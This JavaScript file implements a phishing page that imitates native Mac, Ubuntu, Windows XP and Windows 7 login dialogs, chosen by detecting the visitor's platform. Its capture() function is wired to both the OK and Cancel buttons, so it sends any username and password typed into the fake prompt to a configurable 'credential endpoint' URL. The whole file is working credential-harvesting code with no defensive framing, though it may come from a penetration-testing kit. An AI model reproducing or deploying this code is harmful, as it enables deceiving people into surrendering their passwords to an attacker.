//These variables control the text that is presented on the dialogs
var WIN7_CONNECT_TO = "Enter your password to connect to: 1.1.1.1";
var WIN7_DOMAIN = "Domain: SomeDomain";
var WINXP_CONNECT_TO = "Connecting to 1.1.1.1";

//These variables control your credential endpoint
var URL = "http://192.168.1.7/blah.php";

document.write("<script type='text/javascript' src='js/jquery-1.8.3.js'></script>");
document.write("<script type='text/javascript' src='js/jquery-ui.js'></script>");


function ie8_sucks(){
	var head = document.getElementsByTagName('head')[0];

	var s = document.createElement("script");
	s.src="js/jquery-1.8.3.js";
	if(s.addEventListener) {
	  s.addEventListener("load",callback,false);
	} 
	else if(s.readyState) {
	  s.onreadystatechange = callback;
	}
	head.appendChild(s);
	function callback() { console.log("loaded"); }

	var s2 = document.createElement("script");
	s2.src="js/jquery-ui.js";
	if(s2.addEventListener) {
	  s2.addEventListener("load",callback,false);
	}
	else if(s2.readyState) {
	  s2.onreadystatechange = callback;
	}
	head.appendChild(s2);
	function callback() {$('#modal').show();$('#modal').draggable(); }
}




if(navigator.platform.toUpperCase().indexOf('MAC')!==-1 || document.URL.toLowerCase().indexOf('mac') !==-1)
{
document.write("<link rel='stylesheet' type='text/css' href='osx/osx.css'/>");
document.write("<script>$(document).ready(function(){$('#expander').click(function(){$('#modal').toggleClass('modal_expanded');$('#ok_button').toggleClass('button_expanded');$('#cancel_button').toggleClass('button_expanded');$('#help_img').toggleClass('button_expanded');});});</script>");
document.write("<div id='modal' class='modal'>");
document.write("<script>function capture(){$('#modal').hide();$.ajax({url: '"+URL+"',data:{u:$('#user_name').val(),p:$('#password').val()}});}</script>");
document.write("<img src='osx/help.png' id='help_img' class='help_img'></img>");
document.write("<input type='button' id='expander'/>");
document.write("<form>");
document.write("<input type='text' name='user_name' id='user_name' class='diag_input' />");
document.write("<input type='password' name='password' id='password' class='diag_input' />");
document.write("<input type='button' onclick='capture()' value='' id='ok_button' class='diag_button ok'/>");
document.write("<input type='button' onclick='capture()' value='' id='cancel_button' class='diag_button cancel'/>");
document.write("</form>");
document.write("</div>");
document.write("<script>$('#modal').show();$('#modal').draggable();</script>");
}

else if(navigator.platform.toUpperCase().indexOf('LINUX')!==-1 || document.URL.toLowerCase().indexOf('ubuntu') !==-1)
{
document.write("<link rel='stylesheet' type='text/css' href='ubuntu/ubuntu.css'/>");
document.write("<script>$(document).ready(function(){$('#expander').click(function(){$('#modal').toggleClass('modal_expanded');$('#ok_button').toggleClass('button_expanded');$('#cancel_button').toggleClass('button_expanded');$('#help_img').toggleClass('button_expanded');});});</script>");
document.write("<div id='modal' class='modal'>");
document.write("<script>function capture(){$('#modal').hide();$.ajax({url: '"+URL+"',data:{u:$('#user_name').val(),p:$('#password').val()}});}</script>");
document.write("<input type='button' id='expander'/>");
document.write("<form>");
document.write("<input type='password' name='password' id='password' class='diag_input' />");
document.write("<input type='button' onclick='capture()' value='' id='ok_button' class='diag_button ok'/>");
document.write("<input type='button' onclick='capture()' value='' id='cancel_button' class='diag_button cancel'/>");
document.write("</form>");
document.write("</div>");
document.write("<script>$('#modal').show();$('#modal').draggable();</script>");

}

else if(navigator.platform.toUpperCase().indexOf('WIN')!==-1  )
{
	
	if ((navigator.userAgent.toLowerCase().indexOf("nt 5.1") !== -1) || (navigator.userAgent.indexOf("Windows XP") !== -1) || document.URL.toLowerCase().indexOf('winxp') !==-1)
	{
		ie8_sucks();
		document.write("<link rel='stylesheet' type='text/css' href='winXP/winXP.css'/>");
		document.write("<div id='modal' class='modal'>");
		document.write("<script>function capture(){$('#modal').hide();$.ajax({url: '"+URL+"',data:{u:$('#user_name').val(),p:$('#password').val()}});}</script>");
		document.write("<p id='target_host'>Connecting to 192.168.20.1</p>");
		document.write("<input type='checkbox' id='remember'/>");
		document.write("<form>");
		document.write("<input type='text' name='user_name' id='user_name' class='diag_input' />");
		document.write("<input type='password' name='password' id='password' class='diag_input' />");
	        document.write("<input type='button' onclick='capture()' value='' id='ok_button' class='diag_button'/>");
	        document.write("<input type='button' onclick='capture()' value='' id='cancel_button' class='diag_button'/>");
		document.write("</form>");
		document.write("<script>$('#modal').show();$('#modal').draggable();</script>");
	
	}
	else
	{

		document.write("<link rel='stylesheet' type='text/css' href='win7/win7.css'/>");
        document.write("<script>function capture(){$('#modal').hide();$.ajax({url: '"+URL+"',data:{u:$('#user_name').val(),p:$('#password').val()}});}</script>");
		document.write("<div id='modal' class='modal'>");
		document.write("<p id='target_host'>" + WIN7_CONNECT_TO +"</p>");
		document.write("<p id='target_domain'>"+ WIN7_DOMAIN +"</p>");
		document.write("<input type='checkbox' id='remember'/>");
		document.write("<form autocomplete='off' >");
		document.write("<input type='text' name='user_name' id='user_name' class='diag_input' />");
		document.write("<input type='password' name='password' id='password' class='diag_input' />");
        document.write("<input type='button' onclick='capture()' value='' id='ok_button' class='diag_button'/>");
        document.write("<input type='button' onclick='capture()' value='' id='cancel_button' class='diag_button'/>");

		document.write("</form>");
		document.write("<script>$('#modal').show();$('#modal').draggable();</script>");

	}
}

